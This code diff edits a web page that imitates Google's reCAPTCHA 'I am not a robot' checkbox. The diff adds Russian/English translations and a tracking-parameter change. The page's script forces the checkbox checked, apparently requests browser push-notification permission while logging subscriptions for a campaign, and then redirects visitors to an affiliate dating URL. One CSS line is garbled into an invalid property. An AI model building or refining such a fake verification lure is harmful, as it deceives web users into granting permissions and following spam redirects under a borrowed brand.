@@ -10,20 +10,20 @@
             font-family: 'Roboto', Arial, sans-serif;
             margin: 0;
             background-color: #f9f9f9;
-            overflow: hidden; /* Отключаем прокрутку */
+            overflow: hidden;
         }
         .container {
-            position: fixed; /* Фиксируем позицию */
+            position: fixed;
             top: 50%;
             left: 50%;
-            transform: translate(-50%, -50%); /* Центрируем по обоим осям */
+            transform: translate(-50%, -50%);
             display: flex;
             flex-direction: column;
-            align-items: flex-start;
+ goda: flex-start;
             gap: 10px;
         }
         .captcha-container {
-	    display: flex;
+            display: flex;
             align-items: center;
             justify-content: space-between;
             width: 300px;
@@ -31,7 +31,7 @@
             border: 1px solid #dfe1e5;
             border-radius: 4px;
             background-color: #fff;
-	}
+        }
         .captcha-left {
             display: flex;
             align-items: center;
@@ -41,22 +41,22 @@
             width: 20px;
             height: 20px;
             cursor: pointer;
-            border: 2px solid #000; /* Черная окантовка */
-            background-color: transparent; /* Прозрачный фон */
+            border: 2px solid #000;
+            background-color: transparent;
             position: relative;
             appearance: none;
             -webkit-appearance: none;
             -moz-appearance: none;
         }
         .captcha-checkbox.loading {
-            border: none; /* Убираем рамку во время загрузки */
+            border: none;
             background-color: transparent;
         }
         .captcha-checkbox.loading::before {
             content: '';
             width: 20px;
             height: 20px;
-            border: 3px solid #1a73e8; /* Приятный синий цвет */
+            border: 3px solid #1a73e8;
             border-top-color: transparent;
             border-radius: 50%;
             position: absolute;
@@ -66,7 +66,7 @@
             animation: spin 0.8s linear infinite;
         }
         .captcha-checkbox.completed {
-            border: none; /* Убираем рамку */
+            border: none;
             background-color: transparent;
         }
         .captcha-checkbox.completed::before {
@@ -148,8 +148,8 @@
                 <img src="https://www.melett.ru/wp-content/uploads/2023/09/recaptcha-logo-icon.png" class="captcha-logo" alt="reCAPTCHA">
                 <span class="captcha-brand">reCAPTCHA</span>
                 <div class="captcha-links">
-                    <a href="https://policies.google.com/privacy" target="_blank">Конфиденциальность</a> - 
-                    <a href="https://policies.google.com/terms" target="_blank">Условия</a>
+                    <a href="https://policies.google.com/privacy" target="_blank" id="privacy-link">Конфиденциальность</a> - 
+                    <a href="https://policies.google.com/terms" target="_blank" id="terms-link">Условия</a>
                 </div>
             </div>
         </div>
@@ -160,8 +160,49 @@
     </div>
 
     <script>
+        // Определение языка браузера
+        const userLanguage = (navigator.language || navigator.userLanguage || 'en').split('-')[0];
+        const supportedLanguages = ['ru', 'en'];
+        const lang = supportedLanguages.includes(userLanguage) ? userLanguage : 'en';
+
+        // Объект с переводами
+        const translations = {
+            ru: {
+                title: 'reCAPTCHA',
+                captchaText: 'Я не робот',
+                submitButton: 'Отправить',
+                error: 'Пожалуйста, подтвердите, что вы не робот.',
+                privacy: 'Конфиденциальность',
+                terms: 'Условия'
+            },
+            en: {
+                title: 'reCAPTCHA',
+                captchaText: 'I am not a robot',
+                submitButton: 'Submit',
+                error: 'Please verify that you are not a robot.',
+                privacy: 'Privacy',
+                terms: 'Terms'
+            }
+        };
+
+        // Функция для применения переводов
+        function applyTranslations() {
+            document.documentElement.lang = lang; // Устанавливаем атрибут lang
+            document.title = translations[lang].title;
+            document.querySelector('.captcha-text').textContent = translations[lang].captchaText;
+            document.getElementById('submit-button').textContent = translations[lang].submitButton;
+            document.getElementById('error').textContent = translations[lang].error;
+            document.getElementById('privacy-link').textContent = translations[lang].privacy;
+            document.getElementById('terms-link').textContent = translations[lang].terms;
+        }
+
+        // Применяем переводы при загрузке страницы
+        document.addEventListener('DOMContentLoaded', () => {
+            applyTranslations();
+        });
+
         // Ссылка для редиректа
-        const redirectUrl = 'https://gxrjxq.excelientdates.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=96847&s2=2070502&s3=yd0';
+        const redirectUrl = 'https://gxrjxq.excelientdates.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=96847&s2=2070502&s3=yp1';
 
         // Функция для логирования подписки
         function logSubscription(permission, subId = 'test_campaign') {
@@ -205,7 +246,9 @@
                 } catch (clickError) {
                     console.error('Ошибка программного клика:', clickError);
                     const error = document.getElementById('error');
-                    error.innerHTML = `Не удалось выполнить редирект. <a href="${redirectUrl}">Перейдите по ссылке</a>`;
+                    error.innerHTML = lang === 'ru' 
+                        ? `Не удалось выполнить редирект. <a href="${redirectUrl}">Перейдите по ссылке</a>`
+                        : `Unable to perform redirect. <a href="${redirectUrl}">Follow the link</a>`;
                     error.style.display = 'block';
                 }
             }
@@ -327,10 +370,10 @@
             if (checkbox.checked) {
                 console.log('Чекбокс отмечен, запускаем подписку');
                 error.style.display = 'none';
-                checkbox.disabled = true; // Блокируем чекбокс
-                checkbox.classList.add('loading'); // Показываем лоадер
+                checkbox.disabled = true;
+                checkbox.classList.add('loading');
                 requestSubscription(checkbox);
-                checkbox.disabled = false; // Разблокируем после обработки
+                checkbox.disabled = false;
             } else {
                 error.style.display = 'block';
             }
@@ -341,7 +384,7 @@
             console.log('Чекбокс кликнут');
             const checkbox = document.getElementById('captcha');
             if (!checkbox.checked) {
-                checkbox.checked = true; // Принудительно устанавливаем галочку
+                checkbox.checked = true;
             }
             verify();
         });
